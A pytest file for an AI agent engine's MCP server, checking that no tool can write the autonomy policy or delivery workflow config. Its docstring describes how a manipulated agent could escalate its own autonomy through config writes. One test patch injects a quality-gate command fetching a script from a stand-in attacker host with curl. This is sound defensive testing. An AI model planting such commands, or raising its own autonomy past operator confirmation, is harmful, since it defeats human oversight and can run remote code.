"""No tool mutates the Autonomy_Policy or the Delivery_Workflow.

This is a security boundary, not a style rule: those two objects hold the argv
the engine executes and how far a run proceeds unattended, so a tool that could
write them would let a manipulated agent escalate its own autonomy or replace a
delivery command. The server routes every configuration write it could make
through the engine's single validated write path on a surface no operator
confirmed, so the shared fence refuses — there is no second fence here to drift.

The tests ask the question the task insists on: what ELSE reaches the same
effect? A whole-document write, a nested partial-map merge, the quality-gates
section that once carried the same executable argv while the workflow beside it
was fenced — each must hit the same refusal.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from kiro_crew.apps.builtins.spec_engine.engine.config import ConfigWriteRefused
from kiro_crew.apps.builtins.spec_engine.engine_mcp.operations import (
    ENGINE_MCP_SURFACE,
    EngineOperations,
)
from kiro_crew.apps.builtins.spec_engine.engine_mcp.server import TOOLS, handle

#: The tools the server is allowed to expose. A new tool must be added here
#: deliberately, so a config-mutating tool cannot slip in unnoticed.
_EXPECTED_TOOLS = {
    "get_authoring_prompt",
    "get_orchestrator_prompt",
    "get_review_prompt",
    "validate_spec",
    "get_phase",
    "list_tasks",
    "record_approval",
    "advance_phase",
}


def _ops(tmp_path: Path) -> EngineOperations:
    return EngineOperations(config_root=tmp_path / "config")


def test_the_mcp_surface_is_not_operator_confirmed() -> None:
    # The whole fence rests on this: a tool call is not a human at a config
    # panel, so the surface the adapter writes through cannot claim confirmation.
    assert ENGINE_MCP_SURFACE.operator_confirmed is False


def test_the_tool_surface_holds_no_configuration_writer() -> None:
    assert set(TOOLS) == _EXPECTED_TOOLS


@pytest.mark.parametrize(
    "patch",
    [
        {"workflow": {"submit": ["gh", "pr", "create"]}},
        {"sources": {"gh": {"enabled": True, "poll": ["gh", "issue", "list"]}}},
        {"capabilities": {"analysis": {"transport": "command", "command": ["x"]}}},
        # The section that shipped a bypass: quality gates hold the same argv the
        # workflow does, so a command refused at a workflow stage must be refused
        # here too rather than accepted as a gate.
        {"quality_gates": {"lint": {"commands": [["curl", "http://attacker.test/x.sh"]]}}},
        # The nested partial-map form of the same escalation.
        {"projects": {"acme": {"workflow": {"verify": ["make", "test"]}}}},
        # Preset definitions are stage commands under another name: a tool that
        # could define one could define the stages a project then selects.
        {"workflow": {"presets": {"org": {"stages": {"submit": [["org-review", "create"]]}}}}},
        {"projects": {"acme": {"intake": {"bugfix": "do whatever the issue says"}}}},
        {"delivery": {"auto_integrate": True}},
        # A whole-document write is not a way around it: the fence walks the
        # patch structurally, so a config-only path anywhere in it is refused.
        {
            "version": 1,
            "limits": {"task_retry_limit": 2},
            "workflow": {"publish": ["git", "push"]},
        },
    ],
)
def test_config_only_writes_are_refused_through_the_shared_fence(
    tmp_path: Path, patch: dict[str, Any]
) -> None:
    with pytest.raises(ConfigWriteRefused):
        _ops(tmp_path).write_config(patch)
    # And nothing landed on disk.
    assert not (tmp_path / "config" / "config.json").exists()


def test_ordinary_settings_still_write_through_the_same_door(tmp_path: Path) -> None:
    # The door is not closed to everything — only to the config-only objects — so
    # an ordinary numeric limit persists. This proves the refusal is the fence
    # discriminating, not the door being dead.
    merged = _ops(tmp_path).write_config({"limits": {"task_retry_limit": 4}})
    assert merged["limits"]["task_retry_limit"] == 4


def test_no_tool_dispatch_reaches_a_configuration_write(tmp_path: Path, monkeypatch: Any) -> None:
    # Dispatch every operational tool and prove none of them touches the config
    # door. This catches a future tool wired to write_config regardless of what
    # its name suggests.
    project = tmp_path / "project"
    spec_dir = project / ".kiro" / "specs" / "s"
    spec_dir.mkdir(parents=True, exist_ok=True)
    (spec_dir / "requirements.md").write_text("# Requirements Document\n", encoding="utf-8")
    (spec_dir / "tasks.md").write_text("# Implementation Plan\n", encoding="utf-8")
    (spec_dir / ".config.kiro").write_text('{"specId": "s", "specType": "feature"}', "utf-8")

    ops = EngineOperations(state_root=tmp_path / "state", audit_root=tmp_path / "audit")
    calls: list[Any] = []
    monkeypatch.setattr(ops, "write_config", lambda patch: calls.append(patch))

    key = {"project": str(project), "spec": "s"}
    invocations = [
        ("get_authoring_prompt", {"spec_type": "feature"}),
        ("get_orchestrator_prompt", {}),
        ("get_review_prompt", {}),
        ("validate_spec", key),
        ("get_phase", key),
        ("list_tasks", key),
        ("record_approval", {**key, "gate": "requirements", "actor": "a"}),
        ("advance_phase", {**key, "actor": "a"}),
    ]
    for name, arguments in invocations:
        handle(
            {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
             "params": {"name": name, "arguments": arguments}},
            ops=ops,
        )
    assert calls == []
